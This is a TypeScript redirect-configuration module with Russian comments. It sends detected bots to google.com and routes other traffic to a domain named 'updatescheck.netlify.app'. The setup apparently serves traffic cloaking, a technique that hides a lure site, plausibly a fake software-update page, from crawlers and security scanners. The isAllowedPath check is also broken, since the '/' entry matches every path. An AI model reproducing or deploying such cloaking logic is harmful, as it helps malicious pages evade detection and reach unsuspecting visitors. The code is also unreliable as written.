// Конфигурация редиректов для проекта Marketing

export interface RedirectConfig {
  mainDomain: string;
  botRedirectUrl: string;
  fallbackUrl: string;
  allowedPaths: string[];
  excludedPaths: string[];
}

// Получение конфигурации редиректов
export function getRedirectConfig(): RedirectConfig {
  return {
    // Основной домен проекта (обновите на ваш домен)
    mainDomain: "updatescheck.netlify.app",
    
    // URL для редиректа ботов (обновите на безопасную страницу)
    botRedirectUrl: "https://www.google.com",
    
    // Fallback URL для неопределенных случаев
    fallbackUrl: "https://updatescheck.netlify.app",
    
    // Разрешенные пути (не требуют проверки)
    allowedPaths: [
      "/",
      "/index.html"
    ],
    
    // Исключенные пути (пропускаются без проверки)
    excludedPaths: [
      "/favicon.ico",
      "/robots.txt",
      "/sitemap.xml",
      "/manifest.json",
      "/apple-touch-icon.png",
      "/.well-known",
      "/assets",
      "/css",
      "/js",
      "/images"
    ]
  };
}

// Проверка, нужно ли исключить путь из проверки
export function shouldExcludePath(pathname: string, config: RedirectConfig): boolean {
  return config.excludedPaths.some(excludedPath => 
    pathname.startsWith(excludedPath)
  );
}

// Проверка, является ли путь разрешенным
export function isAllowedPath(pathname: string, config: RedirectConfig): boolean {
  return config.allowedPaths.includes(pathname) || 
         config.allowedPaths.some(allowedPath => 
           pathname.startsWith(allowedPath)
         );
}

// Получение целевого URL для редиректа
export function getTargetUrl(request: Request, config: RedirectConfig): string {
  const url = new URL(request.url);
  const host = request.headers.get("host") || "";
  
  // Если уже на основном домене - возвращаем текущий URL
  if (host.includes(config.mainDomain)) {
    return url.toString();
  }
  
  // Иначе редиректим на основной домен
  return `https://${config.mainDomain}${url.pathname}${url.search}`;
}


